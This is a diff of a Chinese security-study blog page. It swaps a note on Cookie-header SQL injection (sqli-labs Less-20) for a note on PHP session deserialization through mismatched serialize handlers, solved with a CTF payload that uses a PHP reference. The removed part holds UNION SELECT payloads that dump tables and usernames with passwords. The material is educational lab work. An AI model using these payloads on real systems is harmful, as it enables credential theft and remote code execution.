@@ -17,29 +17,29 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
   <meta name="theme-color" content="#f9fafb">
-  <title>学习笔记-SQL-Cookie注入 - rabow's blog</title>
+  <title>学习笔记-PHP-Session 反序列化漏洞 - rabow's blog</title>
 
   
-    <meta name="description" content="这是一份根据您提供的视频整理的Markdown格式学习笔记。 SQL HTTP头 Cookie注入 学习笔记一、 核心概念与原理1. 什么是Cookie？ 临时身份证：Cookie主要用于辨别用户身份、进行Session跟踪，是存储在用户本地终端上的数据（通常经过加密）。 作用：暂存用户的个人信息。当用户登录过某个网站后，在Cookie有效期内再次访问该网站的部分页面时，客户端会直接向服务器发送C">
+    <meta name="description" content="PHP Session 反序列化漏洞一、 核心漏洞原理PHP 在处理 Session 时，会将用户数据序列化后存储在服务器的指定目录（默认为 &#x2F;tmp）。漏洞的根本原因在于：写入 Session 数据和读取 Session 数据时，使用了不同的序列化处理器（Handler），导致解析逻辑出现歧义，从而触发恶意对象的反序列化。 1. 三种常见的 Session 存储格式PHP 内部提供了不同的处理器">
 <meta property="og:type" content="article">
-<meta property="og:title" content="学习笔记-SQL-Cookie注入">
-<meta property="og:url" content="https://www.rabow.xyz/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SQL-Cookie%E6%B3%A8%E5%85%A5/">
+<meta property="og:title" content="学习笔记-PHP-Session 反序列化漏洞">
+<meta property="og:url" content="https://www.rabow.xyz/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-PHP-Session-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
 <meta property="og:site_name" content="rabow&#39;s blog">
-<meta property="og:description" content="这是一份根据您提供的视频整理的Markdown格式学习笔记。 SQL HTTP头 Cookie注入 学习笔记一、 核心概念与原理1. 什么是Cookie？ 临时身份证：Cookie主要用于辨别用户身份、进行Session跟踪，是存储在用户本地终端上的数据（通常经过加密）。 作用：暂存用户的个人信息。当用户登录过某个网站后，在Cookie有效期内再次访问该网站的部分页面时，客户端会直接向服务器发送C">
+<meta property="og:description" content="PHP Session 反序列化漏洞一、 核心漏洞原理PHP 在处理 Session 时，会将用户数据序列化后存储在服务器的指定目录（默认为 &#x2F;tmp）。漏洞的根本原因在于：写入 Session 数据和读取 Session 数据时，使用了不同的序列化处理器（Handler），导致解析逻辑出现歧义，从而触发恶意对象的反序列化。 1. 三种常见的 Session 存储格式PHP 内部提供了不同的处理器">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://www.rabow.xyz/images/avatar.jpg">
-<meta property="article:published_time" content="2026-05-24T05:56:35.000Z">
-<meta property="article:modified_time" content="2026-05-24T08:04:45.927Z">
+<meta property="article:published_time" content="2026-08-05T02:47:04.000Z">
+<meta property="article:modified_time" content="2026-08-05T03:49:37.939Z">
 <meta property="article:author" content="rabow">
 <meta property="article:tag" content="CTF">
-<meta property="article:tag" content="SQL">
+<meta property="article:tag" content="PHP">
 <meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://www.rabow.xyz/images/avatar.jpg">
   
   
   
-  <meta name="keywords" content="SQL,CTF,Web">
+  <meta name="keywords" content="CTF,Web,PHP">
 
   <!-- feed -->
   
@@ -51,7 +51,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"rabow","sameAs":[],"image":"/images/avatar.jpg"},"dateCreated":"2026-05-24T13:56:35+08:00","dateModified":"2026-05-24T16:04:45+08:00","datePublished":"2026-05-24T13:56:35+08:00","description":"","headline":"学习笔记-SQL-Cookie注入","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.rabow.xyz/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SQL-Cookie%E6%B3%A8%E5%85%A5/"},"publisher":{"@type":"Organization","name":"rabow","sameAs":[],"image":"/images/avatar.jpg","logo":{"@type":"ImageObject","url":"/images/avatar.jpg"}},"url":"https://www.rabow.xyz/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SQL-Cookie%E6%B3%A8%E5%85%A5/","keywords":"SQL, CTF, Web","image":[]}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"rabow","sameAs":[],"image":"/images/avatar.jpg"},"dateCreated":"2026-08-05T10:47:04+08:00","dateModified":"2026-08-05T11:49:37+08:00","datePublished":"2026-08-05T10:47:04+08:00","description":"","headline":"学习笔记-PHP-Session 反序列化漏洞","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.rabow.xyz/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-PHP-Session-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},"publisher":{"@type":"Organization","name":"rabow","sameAs":[],"image":"/images/avatar.jpg","logo":{"@type":"ImageObject","url":"/images/avatar.jpg"}},"url":"https://www.rabow.xyz/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-PHP-Session-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","keywords":"CTF, Web, PHP","image":[]}</script>
   
 </head>
 <body>
@@ -82,87 +82,88 @@
 <div class="article banner top">
   <div class="content">
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
-<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-05-24T05:56:35.000Z">2026-05-24</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2026-05-24T08:04:45.927Z">2026-05-24</time></span></div></div></div>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP反序列化</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-08-05T02:47:04.000Z">2026-08-05</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2026-08-05T03:49:37.939Z">2026-08-05</time></span></div></div></div>
     
     <div class="bottom only-title">
       
       <div class="text-area">
-        <h1 class="text title"><span>学习笔记-SQL-Cookie注入</span></h1>
+        <h1 class="text title"><span>学习笔记-PHP-Session 反序列化漏洞</span></h1>
         
       </div>
     </div>
     
   </div>
-  </div><article class="md-text content"><p>这是一份根据您提供的视频整理的Markdown格式学习笔记。</p>
-<h1 id="SQL-HTTP头-Cookie注入-学习笔记"><a href="#SQL-HTTP头-Cookie注入-学习笔记" class="headerlink" title="SQL HTTP头 Cookie注入 学习笔记"></a>SQL HTTP头 Cookie注入 学习笔记</h1><h2 id="一、-核心概念与原理"><a href="#一、-核心概念与原理" class="headerlink" title="一、 核心概念与原理"></a>一、 核心概念与原理</h2><h3 id="1-什么是Cookie？"><a href="#1-什么是Cookie？" class="headerlink" title="1. 什么是Cookie？"></a>1. 什么是Cookie？</h3><ul>
-<li><strong>临时身份证</strong>：Cookie主要用于辨别用户身份、进行Session跟踪，是存储在用户本地终端上的数据（通常经过加密）。</li>
-<li><strong>作用</strong>：暂存用户的个人信息。当用户登录过某个网站后，在Cookie有效期内再次访问该网站的部分页面时，客户端会直接向服务器发送Cookie进行身份验证，免去重复输入账号密码的繁琐。</li>
-<li><strong>安全风险</strong>：如果Cookie被恶意截获（如通过XSS漏洞），攻击者可以伪造身份。同时，如果服务端未对接收到的Cookie进行严格的安全过滤，就会引发<strong>Cookie注入漏洞</strong>。</li>
-</ul>
-<h3 id="2-漏洞产生原理（源码分析）"><a href="#2-漏洞产生原理（源码分析）" class="headerlink" title="2. 漏洞产生原理（源码分析）"></a>2. 漏洞产生原理（源码分析）</h3><ol>
-<li><strong>输入过滤</strong>：用户在前端输入的<code>username</code>和<code>password</code>在后台通过了<code>check_input()</code>函数的严格过滤与实体化转义，因此无法直接在账号密码输入框处进行常规的SQL注入。</li>
-<li><strong>Cookie数据</strong>：登录成功后，服务端调用<code>setcookie()</code>函数生成了名为<code>uname</code>的Cookie。当用户刷新页面或再次访问时，后台直接获取<code>$_COOKIE[&#39;uname&#39;]</code>的值，并<strong>毫无防备地</strong>拼接到SQL查询语句中：</li>
-</ol>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cookiee</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE users.username=&#x27;<span class="subst">$cookiee</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<p>由于变量<code>$cookiee</code>没有任何安全过滤，攻击者可以直接在HTTP头中修改Cookie字段，闭合单引号并执行恶意SQL语句。</p>
-<hr>
-<h2 id="二、-靶场实战演示（以-sqli-labs-Less-20-为例）"><a href="#二、-靶场实战演示（以-sqli-labs-Less-20-为例）" class="headerlink" title="二、 靶场实战演示（以 sqli-labs Less-20 为例）"></a>二、 靶场实战演示（以 sqli-labs Less-20 为例）</h2><h3 id="第一步：正常登录并获取Cookie"><a href="#第一步：正常登录并获取Cookie" class="headerlink" title="第一步：正常登录并获取Cookie"></a>第一步：正常登录并获取Cookie</h3><ul>
-<li>在前端输入正确的用户名和密码（如：<code>admin</code> &#x2F; <code>admin</code>），点击提交。(必须要登录成功)</li>
-<li>登录成功后，页面或浏览器会保留生成的Cookie信息（例如：<code>Cookie: uname=admin</code>）。<strong>不知道为啥用docker搭建的sqlilab就是拿不到cookie，buuctf里面的我试了一下也拿不到cookie，最后我在windows里面搭建了一个靶场就可以了</strong></li>
-</ul>
-<p><img src="/../images/image-26.png" alt="cookie显示"></p>
-<h3 id="第二步：抓包并测试注入点"><a href="#第二步：抓包并测试注入点" class="headerlink" title="第二步：抓包并测试注入点"></a>第二步：抓包并测试注入点</h3><ol>
-<li>使用抓包工具（如 <strong>Burp Suite</strong>）开启拦截<ul>
-<li>我这里直接用hackerbar了，本地ip地址burpsuite不会拦截，后续研究一下怎么拦截</li>
-</ul>
-</li>
-<li>在浏览器中刷新刚才已登录的页面。</li>
-<li>将抓到的数据包发送到重发器（<strong>Repeater</strong>）以便多次测试。</li>
-<li>观察HTTP请求头中的 <code>Cookie: uname=admin</code> 字段。</li>
-</ol>
-<h3 id="第三步：判断字段数"><a href="#第三步：判断字段数" class="headerlink" title="第三步：判断字段数"></a>第三步：判断字段数</h3><ul>
-<li>为了使用联合查询（Union Select），需要先知道当前表的列数。</li>
-<li>在Cookie处构造闭合，使用 <code>ORDER BY</code> 或 <code>GROUP BY</code> 进行测试(这里用不了group by不知道为啥，只能用order by)：</li>
-</ul>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uname=admin&#x27; order by 3#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>最后发现有三列</p>
-<h3 id="第四步：联合查询提取数据"><a href="#第四步：联合查询提取数据" class="headerlink" title="第四步：联合查询提取数据"></a>第四步：联合查询提取数据</h3><ul>
-<li>确认有3个字段后，直接使用 <code>UNION SELECT</code> 替换数据显示位上的内容：</li>
-</ul>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uname=0&#x27; union select 1,2,3#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<p><img src="/../images/image-27.png" alt="查找回显位"></p>
+  </div><article class="md-text content"><h1 id="PHP-Session-反序列化漏洞"><a href="#PHP-Session-反序列化漏洞" class="headerlink" title="PHP Session 反序列化漏洞"></a>PHP Session 反序列化漏洞</h1><h2 id="一、-核心漏洞原理"><a href="#一、-核心漏洞原理" class="headerlink" title="一、 核心漏洞原理"></a>一、 核心漏洞原理</h2><p>PHP 在处理 Session 时，会将用户数据序列化后存储在服务器的指定目录（默认为 <code>/tmp</code>）。漏洞的根本原因在于：<strong>写入 Session 数据和读取 Session 数据时，使用了不同的序列化处理器（Handler），导致解析逻辑出现歧义，从而触发恶意对象的反序列化。</strong></p>
+<h3 id="1-三种常见的-Session-存储格式"><a href="#1-三种常见的-Session-存储格式" class="headerlink" title="1. 三种常见的 Session 存储格式"></a>1. 三种常见的 Session 存储格式</h3><p>PHP 内部提供了不同的处理器来存取 Session 数据，可以通过 <code>php.ini</code> 中的 <code>session.serialize_handler</code> 进行配置：</p>
+<p><img src="/../images/image-141.png" alt="各种处理器对应的存储格式"></p>
 <ul>
-<li>根据页面回显的内容，将回显数字（如2或3）替换为我们需要查询的SQL函数或字段提取语句。</li>
+<li>php处理器传入一个ben为变量，123456的字符串作为例子</li>
+<li>php_serialize以这个代码为例子</li>
 </ul>
-<hr>
-<h2 id="三、-常用注入-Payload-总结"><a href="#三、-常用注入-Payload-总结" class="headerlink" title="三、 常用注入 Payload 总结"></a>三、 常用注入 Payload 总结</h2><p>视频末尾总结了基于Cookie的联合查询注入核心Payload格式（前提是已知字段数为3，且回显位为第2、3位）：</p>
-<p><strong>1. 爆表名 (Table Name)</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;benben&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;ben&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;b&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>php_binary以这个代码为例子(传入的参数跟php_serialize一样)</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;benben&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;ben&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;b&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/../images/image-28.png" alt="表名"></p>
-<p><strong>2. 爆列名&#x2F;字段名 (Column Name)</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27; #</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/../images/image-29.png" alt="字段名"></p>
-<p><strong>3. 爆核心数据 (Data)</strong>
-利用 <code>group_concat</code> 配合自定义分隔符（如逗号或冒号）将账号和密码一起输出：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,group_concat(username,&#x27;</span>:<span class="string">&#x27;,password),3 from users #</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/../images/image-30.png" alt="用户名密码"></p>
-<hr>
-<h2 id="四、-注入思路优先级顺序"><a href="#四、-注入思路优先级顺序" class="headerlink" title="四、 注入思路优先级顺序"></a>四、 注入思路优先级顺序</h2><p>当遇到潜在的SQL注入点时，高到低的顺序依次尝试注入方法：</p>
+<table>
+<thead>
+<tr>
+<th align="center">处理器</th>
+<th align="center">对应的存储格式</th>
+<th align="center">例子</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">php</td>
+<td align="center">键名+竖线+经过 serialize()函数序列化处理的值</td>
+<td align="center">benben &#124; s:8:”dazhuang”;</td>
+</tr>
+<tr>
+<td align="center">php_serialize(php&gt;&#x3D;5.5.4)</td>
+<td align="center">经过srialize()函数序列化处理的数组</td>
+<td align="center">a:2:{s:6:”benben”;s:8:”dazhuang”;s:1:”b”;s:3:”666”;}</td>
+</tr>
+<tr>
+<td align="center">php_binary</td>
+<td align="center">键名的长度对应的ASCII字符+键名+经过serialize()函数反序列化处理的值</td>
+<td align="center">ACKbenbens:8:”dazhuang”;SOHbs:3:”666”;</td>
+</tr>
+</tbody></table>
+<p>这个二进制需要用专门的软件查看</p>
+<p><img src="/../images/image-142.png" alt="二进制软件查看"></p>
+<p>可以看到这里的06表示后面有六个字符</p>
+<h3 id="2-漏洞产生场景"><a href="#2-漏洞产生场景" class="headerlink" title="2. 漏洞产生场景"></a>2. 漏洞产生场景</h3><p>当网站的存取逻辑存在差异时，就会产生漏洞。例如：</p>
+<ul>
+<li><strong>存储时 (Save)</strong> 使用了 <code>php_serialize</code> 处理器。</li>
+<li><strong>读取时 (Read)</strong> 使用了 <code>php</code> 处理器。</li>
+</ul>
+<p><strong>过程：</strong></p>
 <ol>
-<li>优先选用 UNION 联合注入</li>
-<li>如果无回显或限制严格，选择 <strong>报错注入</strong></li>
-<li>如果页面不显示数据库错误，选择 <strong>布尔盲注</strong></li>
-<li>如果连布尔状态不变，选择 <strong>时间盲注</strong></li>
-<li>如果数据库账户拥有文件读取权限，还可考虑结合 DNS log 注入或其他文件操作。</li>
+<li>攻击者向使用 <code>php_serialize</code> 的页面传入恶意 payload：<code>a=|O:1:&quot;D&quot;:...</code></li>
+<li>服务器将其作为数组序列化存储，内容变为类似：<code>a:1:{s:1:&quot;a&quot;;s:X:&quot;|O:1:&quot;D&quot;:...&quot;;}</code></li>
+<li>攻击者访问使用默认 <code>php</code> 处理器的页面。该处理器会将第一个 <code>|</code> 前面的内容（即 <code>a:1:{s:1:&quot;a&quot;;s:X:&quot;</code>）当作键名（Key），将 <code>|</code> 后面的内容（即 <code>O:1:&quot;D&quot;:...</code>）当作独立的对象进行反序列化操作。</li>
+<li>成功实例化恶意类 <code>D</code>，触发如 <code>__destruct()</code> 等魔术方法，造成 RCE。</li>
 </ol>
+<hr>
+<h2 id="二、例题"><a href="#二、例题" class="headerlink" title="二、例题"></a>二、例题</h2><h3 id="1-靶场环境代码审计"><a href="#1-靶场环境代码审计" class="headerlink" title="1. 靶场环境代码审计"></a>1. 靶场环境代码审计</h3><p>靶场包含两个关键页面。</p>
+<p><strong><code>index.php</code> (触发点 - 使用默认 <code>php</code> 处理器读取)</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*hint.php*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$her</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;her=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name===<span class="variable language_">$this</span>-&gt;her)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到开头就有一个session_start</p>
+<p><strong><code>hint.php</code> (写入点 - 声明使用 <code>php_serialize</code> 处理器写入)</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-Bypass-技巧"><a href="#2-Bypass-技巧" class="headerlink" title="2. Bypass 技巧"></a>2. Bypass 技巧</h3><p>目标是让 <code>$this-&gt;name === $this-&gt;her</code>。但是 <code>__wakeup()</code> 魔术方法会在反序列化时被自动调用，给 <code>$her</code> 赋一个 1~10000 随机数的 MD5 哈希值。</p>
+<p><strong>破解：PHP 引用 (<code>&amp;</code>)</strong>
+在构造序列化对象时，我们可以让 <code>$name</code> 成为 <code>$her</code> 的引用（指针指向同一内存地址）。这样，无论 <code>__wakeup()</code> 将 <code>$her</code> 修改成什么随机哈希值，<code>$name</code> 的值都会同步变化，从而永远满足 <code>===</code> 的强等于条件。</p>
+<h3 id="3-Payload-构造"><a href="#3-Payload-构造" class="headerlink" title="3. Payload 构造"></a>3. Payload 构造</h3><p>首先，在本地PHP 脚本，生成引用对象的序列化字符串：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$her</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name = &amp;<span class="variable">$a</span>-&gt;her;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// 运行输出: O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>为了利用 <code>php_serialize</code> 和 <code>php</code> 处理器的解析差异，我们需要在 Payload 前方拼接 <code>|</code> 符号进行 Session 污染。</p>
+<p>完整的 Payload 为：<code>|O:4:&quot;Flag&quot;:2:{s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;}</code></p>
+<p><img src="/../images/image-143.png" alt="最终成功获取flag"></p>
 </article>
 <div class="article-footer">
 
@@ -170,18 +171,18 @@
     <section id="share">
       <div class="header"><span>分享文章</span></div>
       <div class="body">
-        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://www.rabow.xyz/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SQL-Cookie%E6%B3%A8%E5%85%A5/" /></div>
+        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://www.rabow.xyz/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-PHP-Session-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" /></div>
         <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot;)"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
         
         <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
-          <img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://www.rabow.xyz/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SQL-Cookie%E6%B3%A8%E5%85%A5/"/>
+          <img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://www.rabow.xyz/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-PHP-Session-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
         </div>
         
       </div>
     </section>
     </div>
 
-<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SQL-POST%E6%8F%90%E4%BA%A4Referer%E6%B3%A8%E5%85%A5/">学习笔记-SQL-POST提交Referer注入</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SQL-User-Agent-%E6%B3%A8%E5%85%A5/">学习笔记-SQL-User-Agent 注入</a></div></section></div>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-PHP-Phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">学习笔记-PHP-Phar 反序列化漏洞</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/posts/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-PHP-%E5%BC%95%E7%94%A8/">学习笔记-PHP-引用</a></div></section></div>
 
 
 
@@ -195,7 +196,7 @@
 
 
 
